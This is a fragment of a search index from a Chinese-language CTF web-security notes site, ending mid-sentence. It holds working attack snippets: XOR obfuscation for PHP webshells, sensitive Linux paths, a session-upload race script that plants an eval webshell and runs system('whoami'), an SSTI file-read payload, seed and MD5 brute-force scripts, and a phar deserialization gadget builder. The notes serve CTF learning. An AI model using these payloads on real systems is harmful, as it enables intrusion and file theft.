//\u5f97\u5230\u5b57\u7b26 0\nvar_dump('|'^'/'); //\u5f97\u5230\u5b57\u7b26 S\nvar_dump('{'^'/'); //\u5f97\u5230\u5b57\u7b26 T\n$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); //\u53d8\u91cf$__\u503c\u4e3a\u5b57\u7b26\u4e32'_POST'\nPlain Text\n</code></pre> <pre><code>#\u7ed9\u51fa\u811a\u672cif __name__ == \"__main__\":\nfor i in range(0,127):\nfor j in range(0,127):\nresult=i^j\nif(chr(result) is '\u60f3\u8981\u7684\u5b57\u7b26'):\nprint(' '+chr(i)+' xor '+chr(j)+' == '+chr(result))\u7f29\u8fdb\u81ea\u5df1\u6765\nPlain Text\n</code></pre>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/","title":"Web\u5e38\u7528linux\u8def\u5f84","text":"<p>web\u5e38\u7528linux\u8def\u5f84:</p> <p>1./etc/passwd</p> <p>2./etc/hosts</p> <p>3./proc/net/arp</p> <p>4./proc/net/dev</p> <p>5./proc/net/dev_mcast</p> <p>6./proc/net/igmp</p> <p>7./proc/net/netlink</p> <p>8./proc/net/netstat</p> <p>9./proc/net/raw</p> <p>10./proc/net/route</p> <p>11./proc/net/rt_cache</p> <p>12./proc/net/snmp</p> <p>13./proc/net/sockstat</p> <p>14./proc/net/tcp</p> <p>15./proc/net/udp</p> <p>16./proc/net/unix</p>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procself","title":"/proc/self/","text":""},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfenviron","title":"/proc/self/environ","text":"<p>\u5c1d\u8bd5\u8bbf\u95ee/proc/self/environ</p> <p>/proc/self\u2013\u5176\u8def\u5f84\u6307\u5411\u5f53\u524d\u8fdb\u7a0b</p> <p>/environ\u2013\u8bb0\u5f55\u5f53\u524d\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4fe1\u606f</p>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfroot","title":"/proc/self/root","text":"<p>/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u60f3\u5230\u8fd9\u91cc\uff0c\u7528\u4f2a\u534f\u8bae\u914d\u5408\u591a\u7ea7\u7b26\u53f7\u94fe\u63a5\u7684\u529e\u6cd5\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u6f0f\u6d1e\u5b58\u5728\u7684\u4f4d\u7f6e\u4f4d\u4e8ephp\u7684\u5185\u6838\uff08\u6211\u662f\u5f88\u60f3\u5c1d\u8bd5\u505a\u4e00\u6b21\u8c03\u8bd5\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u7740\uff09</p> <pre><code>https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649729209&amp;idx=1&amp;sn=78c1f6cf291e5cfca3088f02216ccffd&amp;chksm=888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare=1&amp;scene=23&amp;srcid=0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime=1597388716474&amp;seharer_shareid=33a823b10ae99f33a60db621d83241cb#rd\nPlain Text\n</code></pre> <p>\u6240\u4ee5\u6700\u540e\uff1a\"/proc/self/root\"*21+/flag\u5c31\u53ef\u4ee5\u5b8c\u6210\u7ed5\u8fc7\u3002</p> <p>[WMCTF2020]Make PHP Great Again</p> <p>\u4ee3\u7801\u5341\u5206\u7b80\u5355\uff0c\u9700\u8981\u7528\u5230\u7684\u662f\u5728\u7fa4\u91cc\u6240\u53d1\u7684\u90a3\u4e2a\u6f0f\u6d1e\uff0c/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\u3002\uff08PHP\u5185\u6838\u6211\u770b\u8d77\u6765\u4e5f\u6bd4\u8f83\u5403\u529b\uff09\u5173\u952e\u70b9\u5e94\u8be5\u662f\uff1alstat\u51fd\u6570\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\u8bfb\u53d6path\u5b58\u5728\u4e86\u4e00\u4e2a\u6700\u5927\u503c\uff0c\u4f1a\u8ba4\u4e3a\u8def\u5f84\u4e0d\u5b58\u5728\uff0c\u7136\u540e\u6709\u53e6\u5916\u4e00\u4e2a\u51fd\u6570virtual_file_ex(..., CWD_FILEPATH)\uff0c\u5f53\u8def\u5f84\u4e0d\u5b58\u5728\u65f6\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5408\u6cd5\u7684\u8def\u5f84\uff0c\u56e0\u6b64\u7ed5\u8fc7lstat\u540e\u76f8\u5f53\u4e8e\u65f6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86\uff0c\u5f53\u7136\u9700\u8981php\u7684\u4f2a\u534f\u8bae\u8bfb\u6d41\u3002</p> <p>\"/proc/self/root\"*21+/flag</p>"},{"location":"web/linux/%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C/","title":"\u5185\u8054\u6267\u884c","text":"<p>linux\u5185\u8054\u6267\u884c\u4e00\u822c\u662f\u7275\u626f\u5230<code>`\uff08\u6ce8\u610f\u662f\u952e\u76d8\u5de6\u4e0a\u89d2\u7684</code>\u4e0d\u662f'\uff09\u548c$()</p> <p>\u8fd9\u4e24\u8005\u7684\u4f5c\u7528\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5c06\u5305\u62ec\u8d77\u6765\u7684\u5185\u5bb9\u5148\u4e8e\u5916\u90e8\u8868\u8fbe\u5f0f\u89e3\u6790</p> <p>\u6bd4\u5982\u8bf4\uff1a</p> <p>cat $(ls) \u548c cat <code>ls</code></p> <p>\u5b9e\u9645\u6548\u679c\u662f\u5148ls \u7136\u540ecat \u201cls\u201d\u547d\u4ee4\u7684\u56de\u663e\uff0c\u5982\u679c\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u6709\u4e2aflag.txt</p> <p>\u4f60\u5c31\u53ef\u4ee5\u5148\u8fdb\u5165\u8fd9\u4e2a\u6587\u4ef6\u5939,\u7136\u540ecat $(ls)\u6765\u8bfb\u53d6flag.txt</p> <p>\u4ed6\u4eec\u90fd\u4e0d\u80fd\u5d4c\u5957\u8c03\u7528\u3002</p> <p>\u6b63\u5e38\u4e00\u822c\u4f7f\u7528$()\uff0c\u56e0\u4e3a\u53cd\u5f15\u53f7\u6709\u65f6\u5019\u4f1a\u88ab\u8f6c\u79fb\uff0c\u4e0d\u8fc7\u5f53\u4e00\u822c\u51fa\u73b0\u5b57\u7b26\u6570\u9650\u5236\u7684\u8bdd\u5219\u4f1a\u4f7f\u7528\u5230</p> <p>``\u539f\u56e0\u662f\u5b83\u5c11\u4e86\u4e00\u4e2a\u5b57\u7b26\u3002</p> <p></p>"},{"location":"web/scripts/Flask-Session%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86/","title":"Flask-Session\u811a\u672c\u89e3\u5bc6","text":"<p>\u7528\u4e8esession\u4f2a\u9020\u4e4b\u4e2d</p> <pre><code>\u56e0\u4e3a\u662f\u5df2\u7ecf\u4e0b\u8f7d\u4e86\u4e0b\u6765\uff0c\u4e0b\u9762\u653e\u4e0a\u4f7f\u7528\u65b9\u6cd5\u5c31\u597d\u4e86\npython3 session_cookie_manager.py decode -c 'ImFhYSI.YEdeLg.moazuNx4ewWV2f6l_7W9mCGDZqU' -s 'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'\u89e3\u5bc6\uff08session\uff09\n\n\npython3 session_cookie_manager.py encode -s '155.560932545' -t \"{'username': b'fuck'}\"\n(\u52a0\u5bc6session)\n</code></pre>"},{"location":"web/scripts/Php_session%E4%B8%AD%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%84%9A%E6%9C%AC/","title":"Php session\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\u811a\u672c","text":"<pre><code>\u6211\u4eec\u521b\u5efa\u7684session\u9ed8\u8ba4\u901a\u5e38\u662f\u4e34\u65f6\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8fdb\u884c\u6761\u4ef6\u7ade\u4e89\u6765\u7ef4\u6301\u6211\u4eec\u7684\u8fde\u63a5\u3002\n\n\n#coding=utf-8\n\nimport io\nimport requests\nimport threading\nsessid = 'TGAO'\ndata = {\"cmd\":\"system('whoami');\"}\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)\n        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\ndef read(session):\n    while True:\n        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)\n        if 'tgao.txt' in resp.text:\n            print(resp.text)\n            event.clear()\n        else:\n            print(\"[+++++++++++++]retry\")\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in xrange(1,30): \n            threading.Thread(target=write,args=(session,)).start()\n\n        for i in xrange(1,30):\n            threading.Thread(target=read,args=(session,)).start()\n    event.set()\n</code></pre>"},{"location":"web/scripts/RC4%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/","title":"RC4\u52a0\u5bc6\u811a\u672c\uff1a","text":"<pre><code>Import base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4\u52a0\u5bc6\u4e3b\u51fd\u6570\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))  # \u6211\u8fd9\u91cc\u6ca1\u7ba1\u79d8\u94a5\u5c0f\u4e8e256\u7684\u60c5\u51b5\uff0c\u5c0f\u4e8e256\u4e0d\u65ad\u91cd\u590d\u586b\u5145\u5373\u53ef\n    # print(\"\u539f\u6765\u7684 s \u76d2\uff1a%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"\u6df7\u4e71\u540e\u7684 s \u76d2\uff1a%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"\u8c03\u7528\u52a0\u5bc6\u7a0b\u5e8f\u6210\u529f\u3002\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    # print(\"res\u7528\u4e8e\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u52a0\u5bc6\u540e\u662f\uff1a%res\" %res)\n    cipher = \"\".join(res)\n    print(\"\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u662f\uff1a%s\" %quote(cipher))\n    #print(\"\u52a0\u5bc6\u540e\u7684\u8f93\u51fa(\u7ecf\u8fc7\u7f16\u7801):\")\n    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}\")\n</code></pre>"},{"location":"web/scripts/md5%E6%88%AA%E6%96%AD%E7%88%86%E7%A0%B4/","title":"md5\u622a\u65ad\u7206\u7834","text":"<pre><code>\u5c31\u662f\u8bf4\u7ed9\u51famd5\u540e\u524d\u591a\u5c11\u4f4d\u6570\u5b57\uff0c\u6c42\u539f\u6570\u5b57\n\u811a\u672c\u5982\u4e0b\nfrom multiprocessing.dummy import Pool as tp\nimport hashlib\n\nknownMd5 = 'af53d'      #\u5df2\u77e5\u7684md5\u660e\u6587\ndef md5(text):\n    return hashlib.md5(str(text).encode('utf-8')).hexdigest()\n\ndef findCode(code):\n    key = code.split(':')\n    start = int(key[0])\n    end = int(key[1])\n    for code in range(start, end):\n        if md5(code)[0:5] == knownMd5:\n            print(code)\n            break\nlist=[]\nfor i in range(3):    #\u8fd9\u91cc\u7684range(number)\u6307\u7206\u7834\u51fa\u591a\u5c11\u7ed3\u679c\u505c\u6b62\n    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))\npool = tp()    #\u4f7f\u7528\u591a\u7ebf\u7a0b\u52a0\u5feb\u7206\u7834\u901f\u5ea6\npool.map(findCode, list)\npool.close()\npool.join()\n</code></pre>"},{"location":"web/scripts/php_seed%E7%88%86%E7%A0%B4/","title":"php seed\u7206\u7834","text":"<pre><code>\u662fphp\u4e2d\u7684\u4e24\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\u5176\u5b9e\u662f\u4f2a\u968f\u673a\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u7206\u7834\u51fa\u6765\u5177\u4f53\u8be5\u600e\u4e48\u505a\u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u597d\u89e3\u91ca\u7684\uff0c\u6240\u4ee5\u5e72\u8106\u76f4\u63a5\u628a\u4ee3\u7801\u653e\u4e0a\u6765\u7528\u597d\u4e86\u3002\n\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'c1z5DuPZXT'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n\u5c06\u751f\u6210\u7684\u53c2\u6570\u653e\u5230\u4e00\u4e2a\u53eb\u505aphp_mt_seed4.0\u7684\u811a\u672c\u4e2d\u5c31\u597d\u4e86\n\u4f7f\u7528\u4e86mt_srand()\u51fd\u6570\u64ad\u79cd\uff0c\u5e76\u4f7f\u7528mt_rand()\u51fd\u6570\u751f\u6210\u968f\u673a\u6570\u3002\u8fd9\u91cc\u7684\u968f\u673a\u6570\u90fd\u662f\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u8981\u5f97\u5230\u79cd\u5b50\uff0c\u5c31\u53ef\u4ee5\u751f\u6210\u76f8\u540c\u7684\u968f\u673a\u6570\u3002\n</code></pre> <p>\u4e0b\u9762\u7684\u4e1c\u897f\u53ef\u4ee5\u4e0b\u8f7dphp_mt_seed4.0\uff1a</p> <p>https://thoughts.aliyun.com/workspaces/5f98e6276b9dce0024026750/docs/607d8129e87e050001924835</p>"},{"location":"web/scripts/%E5%8F%96%E5%8F%8D%E5%AD%97%E7%AC%A6/","title":"\u53d6\u53cd\u5b57\u7b26","text":"<pre><code>&lt;?php\nheader('Content-Type: text/html; charset=utf-8');\n$str = 'string ';\nfor($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)\n{\n    $st = mb_substr($str, $i,1, 'utf-8');\n    $a = ~($st);\n    $b = $a[1];             #\u53d6\u6c49\u5b57\u7684\u7b2c\u4e00\u4f4d\n    if($b==$_GET['a'])      #$_GET['a']\u60f3\u8981\u5f97\u5230\u7684\u5b57\u7b26\n    {\n        echo $st;exit;\n    }\n    }\n?&gt;\n</code></pre>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p><code>phar</code>\u5728\u538b\u7f29\u6587\u4ef6\u5305\u65f6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684<code>meta-data</code>\uff0c\u914d\u5408<code>phar://</code>\u5c31\u80fd\u4e00\u4e9b\u51fd\u6570\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u7cbe\u5fc3\u6784\u9020<code>phar</code>\u5305\u5728\u6ca1\u6709<code>unserialize()</code>\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5f88\u5927\u7684\u62d3\u5c55\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u653b\u51fb\u9762</p>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar_1","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\nPlain Text\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\nPlain Text\n</code></pre>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\nPlain Text\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> <p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; __HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\nPlain Text\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web/serialize/PHP/php_serialize/","title":"\u5b9a\u4e49\u53ca\u7406\u89e3","text":"<p>ps:\uff08\u524d\u4e24\u5c0f\u90e8\u5206\u6709\u57fa\u7840\u7684\u5c31\u4e0d\u7528\u6765\u770b\u4e86\u3002\uff09</p> <p>\u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u6570\u636e\u7684\u4f20\u8f93\u548c\u5b58\u50a8\u3002</p> <p>\u5728\u4f20\u9012\u53d8\u91cf\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u9047\u5230\u53d8\u91cf\u503c\u8981\u8de8\u811a\u672c\u6587\u4ef6\u4f20\u9012\u7684\u8fc7\u7a0b\u3002\u5982\u679c\u4e00\u4e2a\u811a\u672c\u4e2d\u60f3\u8981\u7684\u8c03\u7528\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u7684\u53d8\u91cf\uff0c\u4f46\u662f\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u5df2\u7ecf\u6267\u884c\u5b8c\u6bd5\uff0c\u6240\u6709\u7684\u53d8\u91cf\u548c\u5185\u5bb9\u91ca\u653e\u6389\u4e86\uff0c\u90a3\u8be5\u5982\u4f55\u64cd\u4f5c\u5462\uff1fserialize\u548cunserialize\u5c31\u662f\u89e3\u51b3\u8fd9\u4e00\u95ee\uff0c\u9898\u7684\u5b58\u5728\uff0cserialize\u53ef\u4ee5\u5c06\u53d8\u91cf\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5728\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4fdd\u5b58\u5f53\u524d\u53d8\u91cf\u7684\u503c\uff0c\u800cunserialize\u5219\u53ef\u4ee5\u5c06serialize\u751f\u6210\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u56de\u53d8\u91cf\u3002</p> <p>\u5728PHP\u5e94\u7528\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002</p> <p>PHP\u901a\u8fc7string serialize ( mixed $value )\u548cmixed unserialize ( string $str )\u4e24\u4e2a\u51fd\u6570\u5b9e\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u6267\u884c\u5b8c\u4e4b\u540e\u7684\u7ed3\u679c\u4e3aO:1:\"a\":1:{s:1:\"b\";i:1;}-</p> <p>\u89e3\u8bfb\u7684\u8bdd\u662f\u8fd9\u6837\u7684\uff1a<code>\u5bf9\u8c61\u7c7b\u578b:\u957f\u5ea6:\"\u7c7b\u540d\":\u7c7b\u4e2d\u53d8\u91cf\u7684\u4e2a\u6570:{\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";......}</code></p> <p>\u5982\u679c\u4f7f\u7528unserilize\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u4f1a\u5c06\u8fd9\u4e00\u4e32\u5b57\u7b26\u91cd\u65b0\u52a0\u8f7d\u56de\u7c7b\u3002</p> <p>$a=unserilize('O:1:\"a\":1:{s:1:\"b\";i:1;}')</p> <p>\u7136\u540e\u662f\u6570\u7ec4\u7684\u5e8f\u5217\u5316\uff1a</p> <pre><code>&lt;?php\n\n$data=['PHP','HTML','Java','Python'];\n\necho serialize($data);\necho\u51fa\u6765\u7684\u7ed3\u679c\u5982\u4e0b\uff1a\n\na:4:{i:0;s:3:\"PHP\";i:1;s:4:\"HTML\";i:2;s:4:\"Java\";i:3;s:6:\"Python\";}\n\n\u6211\u4eec\u518d\u7ed9\u8fd9\u6bb5\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u8fdb\u884c\u89e3\u91ca\uff0c\u65b9\u4fbf\u65b0\u624b\u670b\u53cb\u4eec\u4e86\u89e3\u5b66\u4e60\u3002\n\na\uff1a\u8868\u793a\u6574\u4f53\u7684\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u91cc\u662farray\uff1b\n\na:4\u4e2d\u76844\uff1a\u8868\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e2a\u6570\uff1b\n\ni\uff1a\u8868\u793aint\uff0c\u6574\u578b\uff1b\n\n0\uff1a\u8868\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e0b\u6807\uff1b\n\ns\uff1a\u8868\u793astring\uff0c\u5373\u6570\u7ec4\u503c\u7684\u7c7b\u578b\uff1b\n\ns:3\u4e2d3\uff1a\u8868\u793a\u6570\u7ec4\u503c\u7684\u957f\u5ea6\u3002\n</code></pre>"},{"location":"web/serialize/PHP/php_serialize/#magic","title":"MAGIC\u51fd\u6570","text":"<p>\u7c7b\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u4e00\u4e9b\u7279\u6b8a\u7684\u51fd\u6570\u53ebmagic\u51fd\u6570\uff0cmagic\u51fd\u6570\u547d\u540d\u662f\u4ee5\u7b26\u53f7\u201c_\u201d\u5f00\u5934\u7684\uff0c\u6bd4\u5982_construct,_destruct,_toString,_sleep,_wakeup\u7b49\u3002\u8fd9\u4e9b\u51fd\u6570\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u8c03\u7528\uff0c\u6bd4\u5982\uff1a_construct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u8c03\u7528\uff08constructor\uff09\uff1b_destruct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u8c03\u7528\uff08de